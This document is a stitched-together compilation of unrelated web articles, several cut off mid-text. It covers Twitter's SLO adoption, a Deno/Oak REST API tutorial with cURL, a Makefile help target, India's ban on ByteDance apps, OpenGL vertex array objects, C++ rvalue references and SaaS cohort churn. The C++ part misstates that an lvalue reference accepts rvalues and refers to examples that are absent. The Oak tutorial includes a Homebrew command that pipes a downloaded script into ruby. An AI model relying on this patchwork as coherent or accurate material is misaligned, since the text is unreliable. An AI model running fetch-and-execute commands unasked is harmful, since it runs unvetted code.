if no error budget remains” quickly began to fall apart. The very deploy getting blocked could decrease the volume or rate of errors, and possibly even defend the SLO and enable it to be met over its remaining duration of time.&nbsp;<br></p><p>Bearing in mind that they aren’t necessarily meant to be prescriptive, error budgets provide very useful suggestions for service owners in thinking about how to prioritize work. They create an important ‘runway’ for scaling the pace of innovation up or down. For example, overly rapid error budget burndown could be a sign to prioritize mitigation work for the current on-call or an upcoming sprint. Alternatively, not using enough of the error budget could nudge the team to iterate on feature work faster, or experiment more.&nbsp;</p><h3>The benefits of SLO</h3><p>While the team is still early in its adoption of SLOs, they’ve already seen the immense potential and value of SLOs in several ways.&nbsp;<br></p><p><strong><em>From a ‘distributed service zoo’ to a shared language</em></strong></p><p>Twitter has hundreds, if not thousands, of services, making its infrastructure a complex beast to understand. The current members of the Twitter Command Center (TCC) have been around long enough where they generally know what most of the services are and how services ‘snap together’. However, they know that eventually they will reach a point where that becomes impossible, where no one individual can grok how it all works. By investing in SLOs now to help guide discussions, the goal is that by the time they reach that point of un-knowable complexity, they will have set themselves up to manage service metrics programmatically.<br></p><p><strong><em>The right amount of context</em></strong></p><p>Context is the key. Dashboards can easily have hundreds of charts which translate into thousands of metrics. Teams might have tens or hundreds of alerts on their services across multiple data centers. These dashboards, metrics, and alerts are helpful for those running those services, but they're very high context, and information overload for anyone else.&nbsp;<br></p><p>SLOs create the ability to have more directed conversations with shared context. Instead of looking at a hundred pictures of a dashboard, the team can align on the four or five things that matter. lf any of those are not green, others can understand that something's not right without having to know anything else about the service.<br></p><p><strong><em>Dynamic load balancing and load shedding</em></strong></p><p>By making SLOs a first class entity, services can speak it at the programming level, beyond just measuring it. This enables the team to make systematic improvements using SLOs as a building block. For example, the team is exploring whether back pressure in Finagle can instead be SLO-based.<br></p><p>With Finagle, services can programmatically detect when they are under load (typically with second class signals such as CPU), and then signal to redirect traffic to another instance. Instead of relying on second class signals to implement back pressure, a service can directly know if it’s trending towards an SLO violation in order to signal back pressure and reduce load on itself.<br></p><p><strong><em>Graceful degradation</em></strong></p><p>One of the Twitter team’s goals for SLO is in gracefully degrading services during large-scale events to ensure that core functionality is always available. Rather than an all-or-nothing failure mode, the team aims to gracefully degrade services by stripping away peripheral features while maintaining core functionality.<br></p><p>The Twitter team is interested in utilizing SLOs to implement a selective circuit breaker pattern to …</p></div></div>

Both entities result in a client-server architecture (frontend and backend relationship) whereas the backend would be needed for (A) business logic that shouldn't be exposed as source code to the frontend application -- otherwise it would be accessible in the browser -- or for (B) establishing connections to third-party data sources (e.g. database(s)).</p><p>However, don't mistake client application <em>always</em> for frontend and server application <em>always</em> for backend here. These terms cannot be exchanged that easily. Whereas a frontend application is usually something seen in the browser, a backend usually performs business logic that shouldn't be exposed in a browser and often connects to a database as well.</p><pre><pre><p><span>Frontend -&gt; Backend -&gt; Database</span></p></pre></pre><p>But, in contrast, the terms client and server are a matter of perspective. A backend application (Backend 1) which <em>consumes</em> another backend application (Backend 2) becomes a client application (Backend 1) for the server application (Backend 2). However, the same backend application (Backend 1) is still the server for another client application which is the frontend application (Frontend).</p><pre><pre><p><span>Frontend -&gt; Backend 1 -&gt; Backend 2 -&gt; Database</span></p><p><span>// Frontend: Client of Backend 1</span></p><p><span>// Backend 1: Server for Frontend, also Client of Backend 2</span></p><p><span>// Backend 2: Server for Backend 1</span></p></pre></pre><p>If you want to answer the client-server question if someone asks you what role an entity plays in a client-server architecture, always ask yourself who (server) is serving whom (client) and who (client) consumes whom's (backend) functionalities?</p><p>That's the theory behind client-server architectures and how to relate to them. Let's get more practical again. How do client and server applications communicate with each other? Over the years, there existed a few popular communication interfaces (<a href="https://en.wikipedia.org/wiki/Application_programming_interface" target="_blank" rel="noopener noreferrer">APIs</a>) between both entities. However, the most popular one is called <a href="https://en.wikipedia.org/wiki/Representational_state_transfer" target="_blank" rel="noopener noreferrer">REST</a> defined in 2000 by Roy Fielding. It's an architecture that leverages the <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol" target="_blank" rel="noopener noreferrer">HTTP protocol</a> to enable communication between a client and a server application. A server application that offers a REST API is also called a RESTful server. Servers that don't follow the REST architecture a 100% are rather called RESTish than RESTful. In the following, we are going to implement such REST API for our Oak server application, but first let's get to know the tooling that enables us to interact with a REST API.</p><h3 id="exercises"><a href="#exercises" target="_blank" rel="noopener noreferrer" aria-label="exercises permalink"><svg height="0" width="0"></svg></a>Exercises:</h3><ul><li>What's a client-server architecture?</li><li>Read more about <a itemprop="url" href="https://www.robinwieruch.de/what-is-an-api-javascript/">REST APIs&nbsp;and other APIs</a>.</li></ul><h2 id="curl-for-rest-apis"><a href="#curl-for-rest-apis" target="_blank" rel="noopener noreferrer" aria-label="curl for rest apis permalink"><svg height="0" width="0"></svg></a>cURL for REST APIs</h2><p>If you haven't heard about cURL, this section gives you a short excursus about what's cURL and how to use it to interact with (REST) APIs. The definition taken from <a href="https://en.wikipedia.org/wiki/CURL" target="_blank" rel="noopener noreferrer">Wikipedia</a> says: <em>"cURL <!-- -->[...]<!-- --> is a computer software project providing a library and command-line tool for transferring data using various protocols."</em> Since REST is an architecture that uses HTTP, a server that exposes a RESTful API can be consumed with cURL, because HTTP is one of the various protocols.</p><p>First, let's install it one the command line. For now, the installation guide is for MacOS users, but I guess by looking up "curl for windows" online, you will find the setup guide for your desired OS (e.g. Windows) too. In this guide, we will use Homebrew to install it. If you don't have Homebrew, install it with the following command on the command line:</p><pre><pre><p><span>/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"</span></p></pre></pre><p>If you haven't heard about Homebrew, read more about it over <a itemprop="url" href="https://www.robinwieruch.de/developer-setup/">here</a>. Next, install cURL with Homebrew:</p><pre><pre><p><span>brew install curl</span></p></pre></pre><p>Now, start your Oak server from the previous sections. Once your application is started, execute <code>curl http://localhost:8000</code> in another command line window. Make sure the port matches your port and the Oak server is running. After executing the command, you should see the "Hello World!" printed on the command line. Congratulations, you just have consumed your Oak server as a client with something else than a browser.</p><pre><pre><p><span>Browser (Client) -&gt; Oak Server</span></p><p><span>cURL (Client) -&gt; Oak Server</span></p></pre></pre><p>Whether you access your Oak application on <code>http://localhost:8000</code> in the browser or via the command line with cURL, you should see the same result. Both tools act as clients whereas the Oak application is your server. You will see in the next sections how to use cURL to verify your Oak application's REST API, that we are going to implement together, on the command line instead of in the browser.</p><h3 id="exercises-1"><a href="#exercises-1" target="_blank" rel="noopener noreferrer" aria-label="exercises 1 permalink"><svg height="0" width="0"></svg></a>Exercises:</h3><ul><li>Get yourself more familiar with the terms client/server and frontend/backend.</li><li>If you want to have an alternative for cURL which works in the browser, check out <a href="https://www.postman.com/" target="_blank" rel="noopener noreferrer">Postman</a> or <a href="https://insomnia.rest/" target="_blank" rel="noopener noreferrer">Isomnia</a>.</li></ul><h2 id="deno-routes-http-methods-are-rest-operations"><a href="#deno-routes-http-methods-are-rest-operations" target="_blank" rel="noopener noreferrer" aria-label="deno routes http methods are rest operations permalink"><svg height="0" width="0"></svg></a>Deno Routes: HTTP Methods are REST Operations</h2><p>Oak is a perfect choice for a server when it comes to creating and exposing APIs (e.g. REST API) to communicate as a client with your server application. Previously you have already implemented one Oak route, which sends a "Hello Deno", that you have accessed via the browser and cURL. Let's set up more routes to accommodate a RESTful API for your Oak application eventually. Add the following routes to your Oak application whereas the URI itself doesn't change, but the method used from your Oak instance:</p><pre><pre><p><span>import</span><span> </span><span>{</span><span> Application</span><span>,</span><span> Router </span><span>}</span><span> </span><span>from</span><span> </span><span>'https://deno.land/x/oak/mod.ts'</span><span>;</span><span></span></p><p><span></span><span>const</span><span> port </span><span>=</span><span> </span><span>8000</span><span>;</span><span></span></p><p><span></span><span>const</span><span> app </span><span>=</span><span> </span><span>new</span><span> </span><span>Application</span><span>(</span><span>)</span><span>;</span><span></span></p><p><span></span><span>const</span><span> router </span><span>=</span><span> </span><span>new</span><span> </span><span>Router</span><span>(</span><span>)</span><span>;</span><span></span></p><p><span>router</span><span>.</span><span>get</span><span>(</span><span>'/'</span><span>,</span><span> </span><span>(</span><span>ctx</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>  ctx</span><span>.</span><span>response</span><span>.</span><span>body </span><span>=</span><span> </span><span>'Received a GET HTTP method'</span><span>;</span><span></span></p><p><span></span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>router</span><span>.</span><span>post</span><span>(</span><span>'/'</span><span>,</span><span> </span><span>(</span><span>ctx</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>  ctx</span><span>.</span><span>response</span><span>.</span><span>body </span><span>=</span><span> </span><span>'Received a POST HTTP method'</span><span>;</span><span></span></p><p><span></span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>router</span><span>.</span><span>put</span><span>(</span><span>'/'</span><span>,</span><span> </span><span>(</span><span>ctx</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>  ctx</span><span>.</span><span>response</span><span>.</span><span>body </span><span>=</span><span> </span><span>'Received a PUT HTTP method'</span><span>;</span><span></span></p><p><span></span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>router</span><span>.</span><span>delete</span><span>(</span><span>'/'</span><span>,</span><span> </span><span>(</span><span>ctx</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>  ctx</span><span>.</span><span>response</span><span>.</span><span>body </span><span>=</span><span> </span><span>'Received a DELETE HTTP method'</span><span>;</span><span></span></p><p><span></span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>app</span><span>.</span><span>use</span><span>(</span><span>router</span><span>.</span><span>allowedMethods</span><span>(</span><span>)</span><span>)</span><span>;</span><span></span></p><p><span>app</span><span>.</span><span>use</span><span>(</span><span>router</span><span>.</span><span>routes</span><span>(</span><span>)</span><span>)</span><span>;</span><span></span></p><p><span>app</span><span>.</span><span>addEventListener</span><span>(</span><span>'listen'</span><span>,</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>  console</span><span>.</span><span>log</span><span>(</span><span>`</span><span>Listening on: localhost:</span><span>${</span><span>port</span><span>}</span><span>`</span><span>)</span><span>;</span><span></span></p><p><span></span><span>}</span><span>)</span><span>;</span><span></span></p><p><span></span><span>await</span><span> app</span><span>.</span><span>listen</span><span>(</span><span>{</span><span> port </span><span>}</span><span>)</span><span>;</span><span></span></p></pre></pre><p>Every Oak Router instance's method maps to a HTTP method. Let's see how this works: Start your Oak server on the command line again, if it isn't running already, and execute four cURL commands in another command line window. You should see the following output for the commands:</p><pre><pre><p><span>curl http://localhost:8000</span></p><p><span>-&gt; Received a GET HTTP method</span></p><p><span>curl -X POST http://localhost:8000</span></p><p><span>-&gt; Received a POST HTTP method</span></p><p><span>curl -X PUT http://localhost:8000</span></p><p><span>-&gt; Received a PUT HTTP method</span></p><p><span>curl -X DELETE http://localhost:8000</span></p><p><span>-&gt; Received a DELETE HTTP method</span></p></pre></pre><p>By default cURL will use a HTTP GET method. However, you can specify the HTTP method with the <code>-X</code> flag (or <code>--request</code> flag). Depending on the HTTP method you are choosing, you will access different routes of your Oak application -- which here represent only a single API endpoint with an URI so far. You will see later other additions that you can add to your cURL requests.</p><p>That's one of the key aspects of REST: It uses HTTP methods to perform operations on URI(s). Often these operations are referred to as CRUD operations for create, read, update, and delete operations. Next you will see on what these operations are used on the URIs (resources).</p><h3 id="exercises-2"><a href="#exercises-2" target="_blank" rel="noopener noreferrer" aria-label="exercises 2 permalink"><svg height="0" width="0"></svg></a>Exercises:</h3><ul><li>Confirm your <a href="https://codesandbox.io/s/github/the-road-to-deno/deno-oak-rest-api/tree/http-methods" target="_blank" rel="noopener noreferrer">source code for the last section</a>.<ul><li>Confirm your <a href="https://github.com/the-road-to-deno/deno-oak-rest-api/compare/init...http-methods?expand=1" target="_blank" rel="noopener noreferrer">changes from the last section</a>.</li></ul></li><li>Read more about <a href="https://en.wikipedia.org/wiki/Create,_read,_update_and_delete" target="_blank" rel="noopener noreferrer">CRUD operations</a>.</li><li>Try some more cURL commands yourself on the command line.</li></ul><h2 id="oak-routes-uris-are-rest-resources"><a href="#oak-routes-uris-are-rest-resources" target="_blank" rel="noopener noreferrer" aria-label="oak routes uris are rest resources permalink"><svg height="0" width="0"></svg></a>Oak Routes: URIs are REST Resources</h2><p>Another important aspect of REST is that every URI acts as a resource. So far, you have only operated on the root URI with your CRUD operations, which doesn't really represent a resource in REST. In contrast, a resource could be a user resource, for example.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><code>make</code> is great tool to orchestrate the setup and build process of a project. It expects a <code>Makefile</code>, where we define targets to execute, like for example <code>install</code> and <code>run</code>. Then we can use <code>make install</code> and <code>make run</code> to execute those tasks.</p> <p>While target names like <code>install</code> are quite common, the problems arise when we have to deal with a lengthy <code>Makefile</code>, and we are not aware of all the available targets.</p> <p>Hopefully, with a slight modification of our current <code>Makefile</code> and the addition of a new target, we can expose this information and access it from the Terminal app. Let’s see how!</p> <p>First, we will have to document each of the existing targets. To do so, we will add a comment starting with <code>##</code> right after the target’s name.</p> <div><div><pre><code><span>install</span>: <span>## Install </span>
	@echo <span>"Installing..."</span>

run: <span>## Run</span>
	@echo <span>"Running..."</span>
</code></pre></div></div> <p>Then, we will use the <code>grep</code> and <code>sed</code> command to get the name of the target and the documentation, like in the following snippet:</p> <div><div><pre><code>.DEFAULT_GOAL :<span>=</span> <span>help</span>
.PHONY: <span>help

help</span>:
	@grep <span>-E</span> <span>'^[a-zA-Z0-9_-]+:.*?## .*$$'</span> <span>$(</span>MAKEFILE_LIST<span>)</span> <span>\</span>
	| <span>sed</span> <span>-n</span> <span>'s/^\(.*\): \(.*\)##\(.*\)/\1\3/p'</span> <span>\</span>
	| column <span>-t</span>  <span>-s</span> <span>' '</span>
</code></pre></div></div> <p>We will also set the <code>.PHONY</code> and the <code>.DEFAULT_GOAL</code> variables. The last one will make <code>help</code> the default target when running <code>make</code> without a specific target.</p> <p>Now, if we head back to the Terminal app, and run <code>make</code>, we will get the list of the documented targets as an output <img title=":rocket:" alt=":rocket:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f680.png" height="20" width="20"></p>
<pre><code>install  Install
run      Run
</code></pre>

<p>Photo: VCG</p><p>Chinese internet company ByteDance - the parent of the TikTok and Helo apps - could lose up to $6 billion after the Indian government banned 59 Chinese apps following a deadly border clash between Indian and Chinese troops last month, a source close to the matter said.</p><p>The Indian Ministry of Information Technology on Sunday banned the 59 apps, claiming that they were "prejudicial to the sovereignty and integrity of India, defense of India, security of state and public order."</p><p>A source close to ByteDance said that in the past few years, the company had invested more than $1 billion in the Indian market, and the ban could virtually halt ByteDance's business there, causing a loss as high as $6 billion. That figure would exceed the potential losses of all the other apps combined.</p><p>TikTok is a short video-sharing platform under ByteDance, and Helo is a social media platform the company released for the Indian market. Another app called Vigo Video, which is also on the list, is also from the company.</p><p>According to data from Sensor Twoer, a mobile app analysis company, TikTok was downloaded 112 million times in May, with 20 percent of that total in the Indian market, double that of the US market.</p><p>According to Reuters, the Indian government has told local telecom operators to block visits to the 59 apps. For apps that have already been downloaded, the telecom operators must find ways to block users from visiting them. TikTok and Helo are no longer available in Indian app stores, and already-downloaded TikTok apps don't display any content.&nbsp;</p><p>In a statement, TikTok said that it is cooperating with the Indian government to block content, and the app will keep obeying local laws to protect users' privacy.</p><p>Many influencers on the platform were caught off guard by the sudden ban. Kumar Mahato, who shot into the limelight with his old-school Bollywood dance routines, said that he has put more than 18 months of effort into the platform, the Times of India reported.</p><p>"My journey with TikTok is testimony to the fact that such platforms can do wonders for artists like us," said the report citing Kumar, who has about 2.7 million followers on the platform.</p><p>India has long been seen by Bytedance as one of the world's most important markets. In April 2019, the company said that it would invest $1 billion in the Indian market. In July the same year, the company released plans to build a data center in India.</p><p>According to public information, the company has hired more than 2,000 local employees.</p> </div>

<p>Vertex Arrays Objects allow us to send large meshes to the GPU. It is a bit technical, but this is something we only have to do once.</p>



<p><em>This post is part of the <a href="https://www.patternsgameprog.com/series/opengl-2d-facade/">OpenGL 2D Facade series</a></em></p>



<h2>Mesh data</h2>



<p>In the previous post, we created three Numpy arrays:</p>



<ul><li><code>vertices</code>: a [verticeCount, 2] float array with vertex coordinates;</li><li><code>colors</code>: a [verticeCount, 3] float array with vertex colors;</li><li><code>faces</code>: a [faceCount, 3] unsigned int array with vertex indices for each face:&nbsp;<code>faces[f, i]</code>&nbsp;is the index of vertex&nbsp;<code>i</code>&nbsp;of face&nbsp;<code>f</code>.</li></ul>



<p>That’s all we need to make our scene; all that follows presents the OpenGL API which creates the structures.</p>



<p>As I explained previously, I go straight to Vertex Array Objects (VAOs) because it is very efficient compared to drawing using OpenGL direct calls. It is more complicated, but we will “hide” this complexity behind a facade. This facade will have a simple API for 2D games while providing fast rendering.</p>



<h2>Vertex Array Object</h2>



<p>To embed all our data, we must first create a Vertex Array Object (VAO):</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">vaoId = glGenVertexArrays(1)</pre>



<p>The argument of the&nbsp;<code>glGenVertexArrays()</code>&nbsp;is the number of VAO we want: in this example, only one.</p>



<p>We tell that we want to work on this new VAO:</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">glBindVertexArray(vaoId)</pre>



<p>Remember that OpenGL is a state machine; every operation depends on the current context.</p>



<p>VAOs can contain one or more Vertex Buffer Object (VBO). In our example, we need three VBOs:</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">vboIds = glGenBuffers(3)
vertexVboId = vboIds[0]
colorVboId = vboIds[1]
indexVboId = vboIds[2]</pre>



<p>The&nbsp;<code>glGenBuffers()</code>&nbsp;function with argument 3 returns an array with three VBO ids. I create three variables&nbsp;<code>vertexVboId</code>,&nbsp;<code>colorVboId</code>&nbsp;and&nbsp;<code>indexVboId</code>&nbsp;to store those ids.</p>



<h2>Vertices VBO</h2>



<p>Let’s now define the VBO that contains all vertex coordinates:</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">glBindBuffer(GL_ARRAY_BUFFER, vertexVboId)</pre>



<p>The&nbsp;<code>glBindBuffer()</code>&nbsp;function tells that the next VBO operations will be on&nbsp;<code>vertexVboId</code>. Furthermore, the first argument&nbsp;<code>GL_ARRAY_BUFFER</code>tells that this VBO contains vertex attributes. In this case, it includes the vertex coordinates, the most usual attribute.</p>



<p>The next lines send the data inside the Numpy array to the VBO:</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">vertices = np.ascontiguousarray(vertices.flatten())
glBufferData(GL_ARRAY_BUFFER, 4 * len(vertices), vertices, GL_STATIC_DRAW)</pre>



<p>The first line builds a 1D array, so all values are contiguous, as in a buffer. There is a high chance that Numpy already stores data in this format, but we need to call these functions to be 100% sure of it.</p>



<p>The first argument of&nbsp;<code>glBufferData()</code>&nbsp;is consistent with the VBO format.</p>



<p>The second argument is the size of the data in bytes. Since float needs 4 bytes, the total size of the buffer is four times the number of values in the array.</p>



<p>The third argument is the Numpy array with all values.</p>



<p>The last argument is a hint for OpenGL.&nbsp;<code>GL_STATIC_DRAW</code>&nbsp;means that we don’t plan to update the data. Then, the GPU can enable optimizations based on this assumption.</p>



<p>Finally, we set the attributes for this VBO:</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">glVertexAttribPointer(0, 2, GL_FLOAT, GL_FALSE, 0, None)</pre>



<p>The first argument defines an index for this VBO. A usual setup is to set the first VBO with index 0, the second one with index 1, and so on.</p>



<p>The second argument defines the number of values in each vertex. We are working with 2D vertices, so there are two coordinates per vertex.</p>



<p>The third argument defines the type of values. In our case, we use 32-bit float numbers.</p>



<p>The fourth argument tells if our values should be normalized. We don’t need this feature in our example, so we set&nbsp;<code>GL_FALSE</code>.</p>



<p>The fifth argument defines the stride. The stride is the size of a “jump” between two vertices. A zero value means that data is contiguous.</p>



<p>The last argument is another advanced feature we don’t need. A&nbsp;<code>None</code>&nbsp;value means that we don’t need it.</p>



<h2>Colors VBO</h2>



<p>The Vertex Buffer Object is almost the same than the vertices one:</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">glBindBuffer(GL_ARRAY_BUFFER, colorVboId)
colors = np.ascontiguousarray(colors.flatten())
glBufferData(GL_ARRAY_BUFFER, 4 * len(colors), colors, GL_STATIC_DRAW)
glVertexAttribPointer(1, 3, GL_FLOAT, GL_FALSE, 0, None)</pre>



<p>Note the two first arguments of the&nbsp;<code>glVertexAttribPointer()</code>: the first one is 1 instead of 0, and the second one is 3 because there are 3 values per vertex (red, green and blue).</p>



<h2>Faces VBO</h2>



<p>The Vertex Buffer Object for faces is different from the two other ones:</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, indexVboId)
faces = np.ascontiguousarray(faces.flatten())
glBufferData(GL_ELEMENT_ARRAY_BUFFER, 4 * len(faces), faces, GL_STATIC_DRAW)</pre>



<p>The type of this VBO is&nbsp;<code>GL_ELEMENT_ARRAY_BUFFER</code>. It tells OpenGL that it does not contain values but an index. You can only have one index per VAO, and OpenGL uses it for all other VBOs. In our case, OpenGL uses it for the vertex coordinates and the vertex colors. So, every time OpenGL needs the attributes of the ith vertex, it computes&nbsp;<code>vertices[faces[i]]</code>&nbsp;and&nbsp;<code>colors[faces[i]]</code>.</p>



<p>Note that there is no call to&nbsp;<code>glVertexAttribPointer()</code>&nbsp;because you can only have one index buffer. Furthermore, the properties of this buffer are set during the drawing (see below).</p>



<h2>Release the VAO</h2>



<p>Once the VAO and all its VBOs are set, we must release them, using binding functions with a zero id:</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">glBindBuffer(GL_ARRAY_BUFFER, 0)
glBindVertexArray(0)</pre>



<h2>Draw the content of the VAO</h2>



<p>We only need to run the creation of VAO once (except if we want to change its content). Then, we can draw its content in the main loop using the following lines:</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">glBindVertexArray(vaoId)
glEnableVertexAttribArray(0)
glEnableVertexAttribArray(1)
glDrawElements(GL_QUADS, 4 * faceCount, GL_UNSIGNED_INT, None)
glDisableVertexAttribArray(0)
glDisableVertexAttribArray(1)
glBindVertexArray(0)</pre>



<p>Line 1 tells that we want to work on our vaoId.</p>



<p>Lines 2-3 enable the two VBO with vertex coordinates and colors, telling OpenGL that we want to use them for drawing. The first argument in each case is the index we defined during the creating of those VBOs.</p>



<p>Line 4 is the drawing of all rectangles thanks to the&nbsp;<code>glDrawElements()</code>&nbsp;function.</p>



<p>The first argument&nbsp;<code>GL_QUADS</code>&nbsp;indicates that faces have four vertices (replace by&nbsp;<code>GL_TRIANGLES</code>&nbsp;if you want to render triangles).</p>



<p>The second argument is the total number of vertices to draw.</p>



<p>The third argument indicates that the index values are unsigned integers.</p>



<p>The last argument is an advanced options we don’t need now,&nbsp;<code>None</code>&nbsp;means that we don’t use it.</p>



<h2>Delete the buffers</h2>



<p>At the end of the program, after the main loop, we delete the VBOs and the VAO:</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">glDeleteBuffers(3, vboIds)
glDeleteVertexArrays(1, vaoId)</pre>



<p>It is not mandatory when you leave the program. Anyway, it shows you how to do it if you need to delete/create buffers.</p>



<h2>Final program</h2>



<p>Here is the final program:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>The concepts of lvalue and rvalue in C++ had been confusing to me ever since I started to learn C++. I did not fully understand the purpose and motivation of having these two concepts during programming and had not been using rvalue reference in most of my projects. Given most of the documentation on the topic of lvalue and rvalue on the Internet are lengthy and lack of concrete examples, I feel there could be some developers who have been confused as well.</p>



<p>In this blog post, I would like to introduce the concepts of lvalue and rvalue, followed by the usage of rvalue reference and its application in move semantics in C++ programming.</p>

<h3 id="lvalue-vs-rvalue">lvalue VS rvalue</h3>

<p>In C++, each expression, such as an operator with its operands, literals, and variables, has type and value. We could categorize each expression by type or value. Each expression is either lvalue (expression) or rvalue (expression), if we categorize the expression by value. Note that when we say lvalue or rvalue, it refers to the expression rather than the actual value in the expression, which is confusing to some people. So personally I would rather call an expression lvalue expression or rvalue expression, without omitting the word “expression”.</p>



<p>lvalue expression is so-called because historically it could appear on the left-hand side of an assignment expression, while rvalue expression is so-called because it could only appear on the right-hand side of an assignment expression. lvalue expression is associated with a specific piece of memory, the lifetime of the associated memory is the lifetime of lvalue expression, and we could get the memory address of it. rvalue expression might or might not take memory. Even if an rvalue expression takes memory, the memory taken would be temporary and the program would not usually allow us to get the memory address of it.</p>

<h3 id="rvalue-reference">rvalue Reference</h3>

<p><code>T&amp;</code> is the operator for lvalue reference, and <code>T&amp;&amp;</code> is the operator for rvalue reference. Literally it means that lvalue reference accepts an lvalue expression and lvalue reference accepts an rvalue expression.</p>

<p>In this particular example, at first glance, the rvalue reference seems to be useless. Why would we bother to use rvalue reference given lvalue could do the same thing. In the next section, we would see that rvalue reference is used for move semantics which could potentially increase the performance of the program under some circumstances. We would also see that only by rvalue reference we could distinguish move semantics from copy semantics.</p>

<h3 id="move-semantics">Move Semantics</h3>

<p>In C++, we could create a new variable from another variable, or assign the value from one variable to another variable. To keep both variables “alive”, we would use copy semantics, i.e., copy one variable to another. In some scenarios, after assigning the value from one variable to another variable, the variable that gave the value would be no longer useful, so we would use move semantics.</p>



<p>Because move semantics does fewer memory manipulations compared to copy semantics, it is faster than copy semantics in general. Let’s take a look at the following example.</p>

<p>Cohort analysis is a method that allows you to break your data set into the specific groups, examine the lifecycle of each group, and compare them to each other.</p>

<p>It is a great way to find critical points within a customer lifecycle. You can use cohort analysis to understand if you are improving the provided service with time.</p>

<p>In the SaaS world, we usually use cohort analysis to get a deeper understanding of churn or customer retention.</p>

<h2 id="how-to-build-a-cohort">How to build a cohort</h2>

<p>Let's take a SaaS company that already has some customer base. The first step is to split the whole customer base into separate groups – cohorts. In SaaS, we usually group customers by the month they joined the service.</p>

<p>For example, in May 2019 our imaginary SaaS company had 120 new customers. This group of 120 customers will form one May 2019 cohort. Now, from these 120 customers, how many were still using the service as of the end of June 2019? Let’s say 100. From this 100 how many were left in July 2019? And so on. You keep asking this question till the current date.</p>

<p>Here is the progression of the May 2019 cohort.</p>

<p><img src="https://i.snap.as/7z7RCO4.png" alt=""></p>

<p>What can you understand by examining this one cohort? One thing is that within just 13 months the company loses 100 from 120 customers it started with. Certainly not the best performance. The biggest drop happens in Month 1 and Month 13. This is also very useful information. Perhaps it is so because the company sells monthly or yearly contracts.</p>

<p>The next step is to add newer cohorts. Customers joining in the month of June 2019 will form the June cohort and so on.</p>

<p>Here is the example of customer cohorts for our SaaS company:</p>

<p><img src="https://i.snap.as/DsxsSvW.png" alt=""></p>

<p>Once you have split your data set into cohorts with the number of customers,  you can use this data to calculate any SaaS metric to get a deeper understanding of them. Let’s see how we can do that on the example of customer churn, MRR churn, and customer retention.</p>

<h2 id="using-cohort-analysis-to-understand-customer-churn">Using cohort analysis to understand customer churn</h2>

<p>Having the cohorts with customers number is nice, but it is not very visual, and still requires a lot of digging into the numbers to understand what is going on.</p>

<p>Let’s use this data and examine customer churn. For each month of the cohort’s life, we have to calculate what % of customers were lost.</p>

<p>For example, in May 2019 we had 120 customers and only 100 of them were left after a month. So the churn for Month 1 will be:</p>

<p><code>(120 - 100) / 120 = 16%</code></p>

<p>When calculating churn for Month 2 we can do two things. We can either calculate it relative to the previous month like so:</p>

<p><code>(100 - 89) / 100 = 11%</code></p>

<p>Or we can calculate it relative to the Month 0:</p>

<p><code>(120 - 89) / 120 = 25%</code></p>

<p>These two approaches give you a slightly different picture. The first tells you churn at any given month of the cohort life. The second gives you an understanding of what percent of all customers from the given cohort (the month 0 number) were lost until the particular month.</p>

<p>For example, if we started with 120 customers, and in Month 3 churn relative to month 0 is 35% it means that we lost 42 customers already.</p>

<p><code>120 * .35 = 42</code></p>

<p>Let’s calculate churn relative to the previous month for all cohorts.</p>

<p><img src="https://i.snap.as/S5Bj15s.png" alt=""></p>

<p>We have added conditional formatting to highlight cells with higher churn and draw attention to them. This feature is available in Google Spreadsheets and Excel and is very useful when it comes to cohorts visualization.</p>

<p>Now you can clearly see at what month your churn is the highest.</p>

<h2 id="a-few-words-on-calculation-relative-to-month-0-vs-previous-month">A few words on calculation relative to month 0 VS previous month</h2>

